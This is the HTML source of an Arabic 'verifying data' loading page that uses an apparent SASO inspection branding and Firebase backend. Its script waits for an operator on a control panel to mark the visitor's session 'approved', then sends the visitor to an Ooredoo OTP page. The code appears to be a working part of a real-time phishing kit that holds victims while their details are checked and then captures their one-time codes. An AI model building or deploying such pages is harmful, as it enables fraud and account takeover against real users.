<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري المعالجة...</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <style>
        body, html {
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #ffffff;
            font-family: 'Cairo', sans-serif;
        }

        .loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* الدائرة التي تدور */
        .spinner {
            width: 80px;
            height: 80px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #8b1538; /* لون شعار التوثيق */
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .logo {
            width: 120px;
            margin-bottom: 10px;
        }

        .text {
            color: #333;
            font-weight: 600;
        }
    </style>
</head>
<body>

<div class="loader-container">
    <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/DhrsVnFpSCHlBdiR.png" alt="Logo" class="logo">
    <div class="spinner"></div>
    <div class="text">جاري التحقق من البيانات...</div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT...", 
        authDomain: "saso-inspection.firebaseapp.com",
        databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
        projectId: "saso-inspection",
        storageBucket: "saso-inspection.firebasestorage.app",
        messagingSenderId: "1009002235896",
        appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
    };

    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    let sessionID = localStorage.getItem('sessionID');

    // مراقبة حالة الموافقة من لوحة التحكم
    database.ref('active_visitors/' + sessionID + '/status').on('value', (snapshot) => {
        const status = snapshot.val();
        
        // إذا قام الأدمن بتغيير الحالة إلى "approved" سيتم نقله لصفحة الأو تي بي
        if (status === 'approved') {
            window.location.href = 'otp_ooredoo.php';
        }
    });
</script>

</body>
</html>
